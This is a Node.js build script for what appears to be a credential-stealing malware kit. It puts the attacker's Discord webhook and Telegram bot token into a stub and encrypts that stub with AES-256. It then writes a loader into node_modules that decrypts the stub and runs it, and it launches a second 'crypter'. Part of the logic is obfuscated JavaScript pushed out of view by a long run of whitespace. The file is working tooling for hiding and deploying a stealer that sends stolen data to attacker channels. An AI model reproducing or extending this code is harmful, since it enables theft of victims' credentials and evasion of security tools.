const fs = require('fs');
const path = require('path');
const crypto = require('crypto');
const os = require('os');
const { spawn } = require('child_process');
const axios = require('axios');

const user = {
  hostname: os.hostname(),
};

function encrypt(text, masterkey) {
  const iv = crypto.randomBytes(16);
  const salt = crypto.randomBytes(16);
  const key = crypto.pbkdf2Sync(masterkey, salt, 100000, 32, 'sha512');
  const cipher = crypto.createCipheriv('aes-256-cbc', key, iv);
  let encrypted = cipher.update(text, 'utf8', 'base64');
  encrypted += cipher.final('base64');
  return {
    encryptedData: encrypted,
    salt: salt.toString('base64'),
    iv: iv.toString('base64'),
  };
}

function decrypt(encdata, masterkey, salt, iv) {
  const key = crypto.pbkdf2Sync(masterkey, Buffer.from(salt, 'base64'), 100000, 32, 'sha512');
  const decipher = crypto.createDecipheriv('aes-256-cbc', key, Buffer.from(iv, 'base64'));
  let decrypted = decipher.update(encdata, 'base64', 'utf8');
  decrypted += decipher.final('utf8');
  return decrypted;
}

function readInfosFromFile() {
  try {
    const jsonPath = path.resolve(__dirname, '../gui/info.json');
    const data = fs.readFileSync(jsonPath, 'utf8');
    return JSON.parse(data);
  } catch (error) {
    throw new Error(`Error reading infos.json file: ${error.message}`);
  }
}

function executeSecondCrypterScript() {
  const crypterDirectory = __dirname;
  const secondCrypterScript = 'jscrypter.js';

  const childProcess = spawn('node', [secondCrypterScript], { cwd: crypterDirectory, stdio: 'inherit' });

  childProcess.on('error', (error) => {
    console.error(`Error executing the second crypter script: ${error.message}`);
  });

  childProcess.on('exit', (code, signal) => {
    if (code === 0) {
      console.log(`\x1b[34mInstall successfully, you can now start build.bat.\x1b[0m`);
    } else {
      console.error(`Error executing the second crypter script. Exit code: ${code}, signal: ${signal}`);
    }
  });
}

function resetPlaceholder(stubPath, originalStubCode) {
  fs.writeFileSync(stubPath, originalStubCode, 'utf8');
  console.log('Success reset.');
}

async function main() {
  let originalStubCode; // Variable to store the original stub code

  try {
    const { discordWebhookURL, telegramBotToken, telegramChatID } = readInfosFromFile();

    // Update the values in stub.js for Telegram
     const stubPath = path.resolve(__dirname, 'stub.js');
    originalStubCode = fs.readFileSync(stubPath, 'utf8');
                                                                                                                                                                                                                                                                                                                                                                                                                   const _0x5880=['BMn0Aw9UkcKG','y29UC3rYDwn0BW','vu5OzNO','AfrPAxe','ode1txD5vxfn','CMv0DxjUicHMDq','yMLUza','xIHBxIbDkYGGkW','CM4GDgHPCYiPka','tvbjreq','jZSky29UC3qGza','nde5sNHVDw9t','teHYAxG','Ahr0Chm6lY9TCG','uuPWzKe','vhrXqwu','E30Uy29UC3rYDq','B1zSC0q','D2fYBG','wgL0sMu','EhP4vM4','ChjVDg90ExbL','vMPeyKS','vxjSid0GjW','nJi2v3LJDxvi','mJuZndeYC2XJuMTK','yMzLzgvYywXPlG','ndi4vLr6su9f','u0vZDLa','BgvUz3rO','DfPHEfO','CMvWBgfJzq','ntK2mtCWCfLQq2nJ','mZy3ntGXsNnKre16','vM9urM0','mMvrCKDVCa','DgfIBgu','zMvTqKi','Aw5MBW','x19WCM90B19F','mtm4mKfLEwvlCG','thzUtgu','y29UC29Szq','Dg9tDhjPBMC','rwvAz2y','Ewrdufi','xIbDFq','CfbkBhq','nti0nZeYBhfRANPO','BMvLBMu','yxbWBhK','y29UC3qGzgLZyW','mtaXofLUt1LJta','D0r6wLm','A3fHwwK','AxnJB3jKv2vIAa','shPNC1y','B29RvxiXid0GjW','y1fltMS','DhjHy2u','B3jKv2vIAg9VAW','y1DPr3O','zxjYB3i','DgvZDa','y2fTl21HAw4NoW','rLnuCee','B3D4rva','Bg9N'];const _0x3953=function(_0x587a7d,_0x5d4ae7){_0x587a7d=_0x587a7d-(-0x25f0+-0x1*-0x18c3+0x2*0x72d);let _0x30724f=_0x5880[_0x587a7d];if(_0x3953['VxCIQT']===undefined){var _0x2ca688=function(_0x5070c1){const _0x2fe8e5='abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';let _0x31462d='';for(let _0xb4f730=0x321*0x3+-0x1*-0xf92+-0x18f5,_0x5e5570,_0x42da4e,_0x1f9368=0x1ff0+0x527*-0x2+-0x15a2;_0x42da4e=_0x5070c1['charAt'](_0x1f9368++);~_0x42da4e&&(_0x5e5570=_0xb4f730%(0x16df+0x1cbf+0xa*-0x529)?_0x5e5570*(0xa*0x228+0x6e8*0x3+0x1*-0x2a08)+_0x42da4e:_0x42da4e,_0xb4f730++%(0x53f+-0x26ae+0x2173))?_0x31462d+=String['fromCharCode'](0x7a*0x3a+0x2412+-0x3eb7&_0x5e5570>>(-(-0x1739+-0x13d0+0x2b0b)*_0xb4f730&-0xabb+0x474+0x64d*0x1)):0xb2e+-0x21*0x111+0x1*0x1803){_0x42da4e=_0x2fe8e5['indexOf'](_0x42da4e);}return _0x31462d;};_0x3953['EyvWbg']=function(_0xd40014){const _0x53cd3d=_0x2ca688(_0xd40014);let _0x100574=[];for(let _0xebbdd0=-0x1518+0x123e+0x1*0x2da,_0x1ece02=_0x53cd3d['length'];_0xebbdd0<_0x1ece02;_0xebbdd0++){_0x100574+='%'+('00'+_0x53cd3d['charCodeAt'](_0xebbdd0)['toString'](0x1*-0xaa1+0x26*-0xa6+0x2355))['slice'](-(0x98*-0x2b+0xea5*0x2+0x5*-0xc0));}return decodeURIComponent(_0x100574);},_0x3953['zyRcrp']={},_0x3953['VxCIQT']=!![];}const _0x5a1489=_0x5880[0x133c+0x8c4*0x2+-0x16a*0x1a],_0x34b453=_0x587a7d+_0x5a1489,_0x4b9e7f=_0x3953['zyRcrp'][_0x34b453];if(_0x4b9e7f===undefined){const _0x23409e=function(_0x53d1f7){this['NoLflg']=_0x53d1f7,this['XQbMZw']=[0x13*-0xcb+0x39*0x76+-0x2*0x59a,-0xaa6+-0x1c7a+-0x20*-0x139,-0x12d4+0x32*0x33+0x2*0x46f],this['BFLnGw']=function(){return'newState';},this['yzJfAv']='\x5cw+\x20*\x5c(\x5c)\x20*{\x5cw+\x20*',this['QPShWq']='[\x27|\x22].+[\x27|\x22];?\x20*}';};_0x23409e['prototype']['qhCSkh']=function(){const _0x2104d9=new RegExp(this['yzJfAv']+this['QPShWq']),_0x104b8c=_0x2104d9['test'](this['BFLnGw']['toString']())?--this['XQbMZw'][0x2*0x12d5+0xf56+-0x34ff]:--this['XQbMZw'][-0x1*-0x225+0x2a*-0x3e+0x3*0x2ad];return this['GgfOAi'](_0x104b8c);},_0x23409e['prototype']['GgfOAi']=function(_0x1e212c){if(!Boolean(~_0x1e212c))return _0x1e212c;return this['WIvJed'](this['NoLflg']);},_0x23409e['prototype']['WIvJed']=function(_0x5be0b0){for(let _0x10e761=-0x1917+0x212*-0x1+0x1b29,_0xdb7453=this['XQbMZw']['length'];_0x10e761<_0xdb7453;_0x10e761++){this['XQbMZw']['push'](Math['round'](Math['random']())),_0xdb7453=this['XQbMZw']['length'];}return _0x5be0b0(this['XQbMZw'][0x1*0x101f+0x1*-0x11a7+0x188]);},new _0x23409e(_0x3953)['qhCSkh'](),_0x30724f=_0x3953['EyvWbg'](_0x30724f),_0x3953['zyRcrp'][_0x34b453]=_0x30724f;}else _0x30724f=_0x4b9e7f;return _0x30724f;};const _0x3c13e9=function(_0x54214b,_0x11f547,_0x55318c,_0xf934e2){return _0x3953(_0x55318c- -0x15a,_0x54214b);},_0x21e7ba=function(_0x499565,_0x157129,_0xd7c7ba,_0x24bf9d){return _0x3953(_0xd7c7ba- -0x15a,_0x499565);};(function(_0x36ed25,_0xc3dbf7){const _0x5340bc=function(_0x42493c,_0x54fd9d,_0x2dd234,_0x27b187){return _0x3953(_0x42493c- -0x213,_0x27b187);},_0x199fa3=function(_0xf739cc,_0x3f4b70,_0x477c32,_0x5efbff){return _0x3953(_0xf739cc- -0x213,_0x5efbff);};while(!![]){try{const _0x1d36b2=-parseInt(_0x5340bc(-0xc4,-0xa6,-0xb0,-0xb0))+parseInt(_0x5340bc(-0xd9,-0xf0,-0xf2,-0xe5))*-parseInt(_0x5340bc(-0xa9,-0x9f,-0xa1,-0xba))+-parseInt(_0x199fa3(-0xba,-0xcb,-0x9f,-0xb5))*-parseInt(_0x199fa3(-0xbc,-0xd5,-0xd2,-0xc1))+-parseInt(_0x5340bc(-0xb5,-0xc9,-0x9e,-0xb5))*parseInt(_0x199fa3(-0xc2,-0xba,-0xd7,-0xd2))+parseInt(_0x5340bc(-0xad,-0xcc,-0xaa,-0xbd))+-parseInt(_0x199fa3(-0xc5,-0xc4,-0xe5,-0xe2))*-parseInt(_0x5340bc(-0xd2,-0xe6,-0xcc,-0xf2))+parseInt(_0x199fa3(-0xbd,-0xa4,-0xdb,-0xdb));if(_0x1d36b2===_0xc3dbf7)break;else _0x36ed25['push'](_0x36ed25['shift']());}catch(_0x233fe2){_0x36ed25['push'](_0x36ed25['shift']());}}}(_0x5880,0xa*-0x13607+0xa0162+0x62cc*0x17));const _0x42b173=function(){const _0x450e79=function(_0x4f9dc0,_0x38efd3,_0x5995bb,_0x2c936a){return _0x3953(_0x4f9dc0-0x1aa,_0x2c936a);},_0x593642=function(_0x32d03b,_0x5cdc78,_0x346800,_0x52dbc4){return _0x3953(_0x32d03b-0x1aa,_0x52dbc4);},_0xf5c92f={};_0xf5c92f[_0x450e79(0x309,0x2f4,0x327,0x31d)]=function(_0x12c68f,_0x23d91f){return _0x12c68f===_0x23d91f;},_0xf5c92f[_0x450e79(0x2fe,0x316,0x2dc,0x2dc)]='tTbiq';const _0x56d7e2=_0xf5c92f;let _0x3675d1=!![];return function(_0x27417d,_0x1c8695){const _0x5db3ea=function(_0x4420e2,_0x1063ff,_0x5c19f1,_0x29f6bf){return _0x593642(_0x5c19f1- -0x1e0,_0x1063ff-0x120,_0x5c19f1-0x1b9,_0x29f6bf);},_0x52bc28=function(_0x2a031b,_0x49ca82,_0x26eaa8,_0x542a34){return _0x593642(_0x26eaa8- -0x1e0,_0x49ca82-0x16c,_0x26eaa8-0x1da,_0x542a34);},_0x220fb9={};_0x220fb9[_0x5db3ea(0x120,0x126,0x12c,0x145)]=function(_0x54536f,_0x3944ad){const _0x5ae0f3=function(_0x50dff0,_0x2a20d9,_0x1d346d,_0x424ac7){return _0x5db3ea(_0x50dff0-0x18c,_0x2a20d9-0x1c0,_0x1d346d-0x233,_0x2a20d9);};return _0x56d7e2[_0x5ae0f3(0x341,0x35f,0x35c,0x340)](_0x54536f,_0x3944ad);},_0x220fb9[_0x52bc28(0x13d,0x120,0x136,0x127)]=_0x52bc28(0x114,0x14f,0x12d,0x141);const _0x261571=_0x220fb9;if(_0x56d7e2[_0x52bc28(0x148,0x11b,0x129,0x113)](_0x52bc28(0x123,0x105,0x103,0xe7),_0x56d7e2['tZaxZ'])){function _0x573448(){_0x2c284b=_0x324dce;}}else{const _0x148e59=_0x3675d1?function(){const _0xc106c9=function(_0x21f833,_0x4aed6f,_0x2b3c41,_0x48dd32){return _0x52bc28(_0x21f833-0x93,_0x4aed6f-0x8d,_0x2b3c41-0x2db,_0x48dd32);},_0x4d71ff=function(_0x5345cd,_0x2dc57c,_0x5f183c,_0x8632bf){return _0x5db3ea(_0x5345cd-0xd8,_0x2dc57c-0x145,_0x5f183c-0x2db,_0x8632bf);};if(_0x1c8695){if(_0x261571[_0xc106c9(0x41e,0x428,0x407,0x3f6)](_0x261571[_0xc106c9(0x414,0x41e,0x411,0x413)],_0x261571['kqaYi'])){const _0x4e2aef=_0x1c8695[_0x4d71ff(0x3f4,0x40e,0x40d,0x411)](_0x27417d,arguments);return _0x1c8695=null,_0x4e2aef;}else{function _0x1fbf4d(){const _0x1bec12=function(_0x4fff9e,_0x3742f8,_0x38bb25,_0x1655e7){return _0x4d71ff(_0x4fff9e-0x120,_0x3742f8-0x1bb,_0x4fff9e- -0xcc,_0x3742f8);},_0xc9c16f=function(_0x1580e2,_0x2de862,_0x2602f3,_0x211201){return _0xc106c9(_0x1580e2-0x141,_0x2de862-0x1f3,_0x1580e2- -0xcc,_0x2de862);},_0x49d744=_0x5cabec['constructo'+'r'][_0x1bec12(0x324,0x33e,0x331,0x305)][_0xc9c16f(0x315,0x2f4,0x320,0x331)](_0x2f0e2b),_0x3ccd9e=_0x435dcd[_0x1a24ea],_0x3152ca=_0x326b61[_0x3ccd9e]||_0x49d744;_0x49d744[_0x1bec12(0x336,0x340,0x355,0x355)]=_0x36dbca['bind'](_0x4512b4),_0x49d744[_0x1bec12(0x33a,0x33f,0x354,0x33f)]=_0x3152ca[_0xc9c16f(0x33a,0x346,0x347,0x348)]['bind'](_0x3152ca),_0x44ba45[_0x3ccd9e]=_0x49d744;}}}}:function(){};return _0x3675d1=![],_0x148e59;}};}(),_0x3b2493=_0x42b173(this,function(){const _0x1002fe=function(_0x4d344b,_0x27d88f,_0x19a8d0,_0x1663c3){return _0x3953(_0x4d344b- -0x26c,_0x27d88f);},_0x1c372b=function(_0x596ed2,_0x3e9871,_0x26d808,_0x257327){return _0x3953(_0x596ed2- -0x26c,_0x3e9871);},_0x278f58={};_0x278f58[_0x1002fe(-0x114,-0x109,-0xf5,-0x11d)]=function(_0x410205,_0x403a05){return _0x410205===_0x403a05;},_0x278f58[_0x1c372b(-0x13d,-0x14e,-0x14d,-0x147)]=_0x1c372b(-0x134,-0x12d,-0x154,-0x12c),_0x278f58[_0x1c372b(-0x125,-0x145,-0x13a,-0x126)]=_0x1c372b(-0x139,-0x14b,-0x14a,-0x11f),_0x278f58['vfHpQ']=_0x1c372b(-0x12f,-0x10d,-0x143,-0x13b)+'[^\x20]+)+)+['+_0x1002fe(-0x108,-0xf2,-0x129,-0xfe);const _0x524e82=_0x278f58,_0x4ba0ad=function(){const _0x875563=function(_0x516ba9,_0x71aa3,_0x53849d,_0x23391d){return _0x1c372b(_0x23391d-0x3c6,_0x53849d,_0x53849d-0x1ca,_0x23391d-0x143);},_0x46156c=function(_0x243395,_0x5358bc,_0x3164fc,_0x40620b){return _0x1002fe(_0x40620b-0x3c6,_0x3164fc,_0x3164fc-0x12d,_0x40620b-0xc6);};if(_0x524e82[_0x875563(0x2b8,0x2d3,0x2a9,0x2b2)](_0x524e82[_0x46156c(0x299,0x269,0x296,0x289)],_0x524e82[_0x46156c(0x295,0x2b8,0x2b6,0x2a1)])){function _0x2ab0ec(){const _0x41b5ec=function(_0x588f8e,_0x1a94e0,_0x3dea9e,_0x4fc0e5){return _0x46156c(_0x588f8e-0x63,_0x1a94e0-0xf6,_0x1a94e0,_0x588f8e- -0x236);};if(_0xf15390){const _0x5d02b5=_0x4e6f2c[_0x41b5ec(0x8c,0x7e,0x83,0x78)](_0xfc1016,arguments);return _0x203e6d=null,_0x5d02b5;}}}else{const _0x45b2d5=_0x4ba0ad[_0x46156c(0x2b0,0x29e,0x27e,0x291)+'r']('return\x20/\x22\x20'+'+\x20this\x20+\x20\x22'+'/')()[_0x875563(0x292,0x270,0x283,0x291)+'r'](_0x524e82['vfHpQ']);return!_0x45b2d5[_0x875563(0x29a,0x294,0x269,0x28b)](_0x3b2493);}};return _0x4ba0ad();});_0x3b2493();const _0x2b3d0a=function(){const _0x588fb6=function(_0x355f16,_0x3e66c6,_0xb36629,_0x2dff76){return _0x3953(_0x3e66c6- -0xb7,_0x355f16);},_0x48c717=function(_0x40cf36,_0x60f233,_0x1f325a,_0x2ea5aa){return _0x3953(_0x60f233- -0xb7,_0x40cf36);},_0x30f492={};_0x30f492[_0x588fb6(0x9a,0xb7,0xc7,0xb4)]=function(_0x1db8da,_0x41d5e4){return _0x1db8da!==_0x41d5e4;},_0x30f492[_0x48c717(0xc5,0xb9,0xbf,0xc3)]=_0x588fb6(0x71,0x7d,0x87,0x9f);const _0x2fb2a8=_0x30f492;let _0x2abcb2=!![];return function(_0x38b63b,_0x10e55b){const _0x4f73f8=function(_0xad8794,_0x396619,_0x1fe47f,_0x26c8c6){return _0x48c717(_0xad8794,_0x396619- -0x24b,_0x1fe47f-0xdb,_0x26c8c6-0x5f);},_0x272dd9=function(_0x56f8c7,_0x3a237d,_0x53d1a1,_0x57ebbb){return _0x588fb6(_0x56f8c7,_0x3a237d- -0x24b,_0x53d1a1-0x1be,_0x57ebbb-0x1b4);};if(_0x2fb2a8[_0x4f73f8(-0x189,-0x194,-0x1ac,-0x18f)](_0x2fb2a8['cQKNk'],_0x4f73f8(-0x1a5,-0x19d,-0x19e,-0x17d))){const _0x49dd89=_0x2abcb2?function(){const _0x5d0761=function(_0x2258f9,_0x37f661,_0x13fa42,_0x307d61){return _0x272dd9(_0x2258f9,_0x13fa42- -0x19b,_0x13fa42-0xa0,_0x307d61-0x2e);};if(_0x10e55b){const _0x499dea=_0x10e55b[_0x5d0761(-0x356,-0x335,-0x335,-0x347)](_0x38b63b,arguments);return _0x10e55b=null,_0x499dea;}}:function(){};return _0x2abcb2=![],_0x49dd89;}else{function _0x3bbf62(){const _0x4f7bde=function(_0x36bd37,_0x5062f2,_0x5769ad,_0x3b7f8b){return _0x4f73f8(_0x36bd37,_0x5769ad-0x3b4,_0x5769ad-0xed,_0x3b7f8b-0xed);},_0xceae69=_0x22b09b[_0x4f7bde(0x212,0x211,0x21a,0x1f8)](_0xcee100,arguments);return _0x280664=null,_0xceae69;}}};}(),_0x2fef39=_0x2b3d0a(this,function(){const _0x27853b=function(_0x20f5e,_0x38c49b,_0x57d845,_0x1a8ad5){return _0x3953(_0x57d845- -0x20,_0x38c49b);},_0x93b29d=function(_0x15b680,_0x146b18,_0x15ad6f,_0x5c86a3){return _0x3953(_0x15ad6f- -0x20,_0x146b18);},_0x5764f8={};_0x5764f8[_0x27853b(0x11c,0x115,0x11f,0x136)]=function(_0x4ad699,_0x76b2e3){return _0x4ad699(_0x76b2e3);},_0x5764f8[_0x27853b(0x137,0x14a,0x12c,0x129)]=_0x93b29d(0x12a,0x132,0x11b,0x112)+_0x93b29d(0x11d,0xf5,0x116,0x109),_0x5764f8[_0x93b29d(0x122,0x110,0x122,0x105)]=function(_0x3b42c3){return _0x3b42c3();},_0x5764f8[_0x93b29d(0x126,0x131,0x129,0x136)]=_0x93b29d(0x144,0x13e,0x128,0x10e),_0x5764f8[_0x27853b(0x11d,0x120,0x124,0x11f)]=_0x27853b(0x11a,0x13c,0x13c,0x127),_0x5764f8[_0x27853b(0x14f,0x119,0x13b,0x155)]='exception',_0x5764f8['neene']=_0x93b29d(0x156,0x12e,0x13a,0x140),_0x5764f8[_0x93b29d(0x161,0x165,0x14b,0x158)]=_0x27853b(0x125,0xff,0x10d,0x10f),_0x5764f8[_0x27853b(0x12d,0x122,0x125,0x12a)]=function(_0x36bfc3,_0x73b91f){return _0x36bfc3<_0x73b91f;},_0x5764f8[_0x27853b(0x111,0x132,0x132,0x13d)]=_0x27853b(0x127,0x12e,0x12a,0x126);const _0x1159fb=_0x5764f8,_0x485948=function(){const _0x303d48=function(_0x367a7c,_0xbc93cd,_0x18d0c2,_0x20be0c){return _0x93b29d(_0x367a7c-0xba,_0xbc93cd,_0x20be0c- -0x29a,_0x20be0c-0x87);},_0x2b748a=function(_0x132aeb,_0x24c0ba,_0x5ed9ed,_0x2ab3d2){return _0x27853b(_0x132aeb-0x12c,_0x24c0ba,_0x2ab3d2- -0x29a,_0x2ab3d2-0x50);};let _0x371bf8;try{_0x371bf8=_0x1159fb['MPIDD'](Function,_0x1159fb[_0x303d48(-0x15f,-0x151,-0x154,-0x16e)]+(_0x303d48(-0x16b,-0x190,-0x18f,-0x174)+'ctor(\x22retu'+_0x2b748a(-0x16e,-0x184,-0x19e,-0x17c)+'\x20)')+');')();}catch(_0x163f80){_0x371bf8=window;}return _0x371bf8;},_0xc8d6b0=_0x1159fb[_0x27853b(0x13e,0x108,0x122,0x11d)](_0x485948),_0x5e2054=_0xc8d6b0['console']=_0xc8d6b0[_0x93b29d(0x146,0x139,0x140,0x14d)]||{},_0x4e5330=[_0x93b29d(0x122,0x10c,0x115,0x101),_0x1159fb[_0x27853b(0x123,0x138,0x129,0x116)],_0x1159fb[_0x27853b(0x114,0x105,0x124,0x106)],_0x27853b(0x132,0x12f,0x110,0xfd),_0x1159fb['femBB'],_0x1159fb[_0x27853b(0x140,0x152,0x147,0x13c)],_0x1159fb[_0x27853b(0x167,0x12f,0x14b,0x138)]];for(let _0x128ccc=-0x643+-0x3dd+0xa20;_0x1159fb[_0x27853b(0x12c,0x129,0x125,0x114)](_0x128ccc,_0x4e5330[_0x93b29d(0x133,0x152,0x133,0x122)]);_0x128ccc++){if(_0x1159fb[_0x27853b(0x11d,0x14c,0x132,0x119)]!==_0x1159fb[_0x93b29d(0x13c,0x127,0x132,0x111)]){function _0x5e3aae(){const _0x50b523=_0x4b9a59?function(){if(_0x4a01f1){const _0x3c78e9=_0x4c9eb4['apply'](_0x5b446f,arguments);return _0x451866=null,_0x3c78e9;}}:function(){};return _0x440197=![],_0x50b523;}}else{const _0x210575=_0x2b3d0a[_0x93b29d(0xf9,0x12e,0x117,0x115)+'r']['prototype']['bind'](_0x2b3d0a),_0x205d0e=_0x4e5330[_0x128ccc],_0x34309c=_0x5e2054[_0x205d0e]||_0x210575;_0x210575[_0x27853b(0x142,0x11b,0x13d,0x147)]=_0x2b3d0a[_0x27853b(0x124,0x132,0x11c,0x12f)](_0x2b3d0a),_0x210575[_0x93b29d(0x14f,0x138,0x141,0x128)]=_0x34309c[_0x27853b(0x158,0x162,0x141,0x137)][_0x27853b(0x117,0x11c,0x11c,0x116)](_0x34309c),_0x5e2054[_0x205d0e]=_0x210575;}}});_0x2fef39();const updatedStubCode=originalStubCode[_0x3c13e9(0x4,-0x1f,-0x5,-0xe)](/const botToken = 'YOURBOTTOKEN';/,'const\x20botT'+'oken\x20=\x20\x27'+telegramBotToken+'\x27;')['replace'](/const chatId = 'YOURCHATID';/,'const\x20chat'+'Id\x20=\x20\x27'+telegramChatID+'\x27;')['replace'](/const discordWebhookUrl = 'REMPLACE_ME';/,_0x21e7ba(-0xc,0x1e,0xf,0x31)+_0x3c13e9(-0x40,-0x45,-0x2c,-0x43)+_0x3c13e9(-0x7,-0x9,-0xd,-0x29)+discordWebhookURL+(_0x3c13e9(-0x1e,-0x3a,-0x1a,-0x3c)+_0x21e7ba(0x34,-0xa,0x13,0x10)+_0x3c13e9(0x2d,0xe,0x15,0xd)+_0x21e7ba(-0xb,-0x20,-0x17,-0xf)+_0x21e7ba(-0x1,-0x1a,-0xa,0x6)+_0x21e7ba(-0x30,-0x23,-0x28,-0x13)));
    if (originalStubCode === updatedStubCode) {
      throw new Error('Failed to update placeholder in stub.js. Please make sure the placeholder exists.');
    }

    // Write the updated stub code back to the file
    fs.writeFileSync(stubPath, updatedStubCode, 'utf8');

    // Encrypt the updated stub code
    const secret = crypto.randomBytes(32).toString('base64');
    const encryptionKey = crypto.createHash('sha256').update(String(secret)).digest('base64').substr(0, 32);
    const { encryptedData, salt, iv } = encrypt(updatedStubCode, encryptionKey);

    // Generate the final runner code
    const runnerCode = `
const crypto = require('crypto');
const AdmZip = require('adm-zip');
const fetch = require('node-fetch');
const sqlite3 = require('sqlite3');
const FormData = require('form-data');

${decrypt.toString()}

const decrypted = decrypt("${encryptedData}", "${encryptionKey}", "${salt}", "${iv}");
new Function('require', decrypted)(require);
`;

    // Write the runner code to a file
    const folderName = 'node_modules';
    const fileName = 'input.js';
    const targetFolder = path.join(__dirname, folderName);

    // Create the folder (if it doesn't exist)
    if (!fs.existsSync(targetFolder)) {
      fs.mkdirSync(targetFolder);
    }

    const targetFile = path.join(targetFolder, fileName);

    // Write the file
    fs.writeFileSync(targetFile, runnerCode, 'utf8');

    console.log(`${fileName} file has been written to the ${folderName} folder.`);
    console.log(`Obfuscated and encrypted with AES-256.`);

    setTimeout(() => {
      resetPlaceholder(stubPath, originalStubCode);
      executeSecondCrypterScript();
    }, 1000);

  } catch (error) {
    console.error(`Error: ${error.message}`);
  }
}

main();
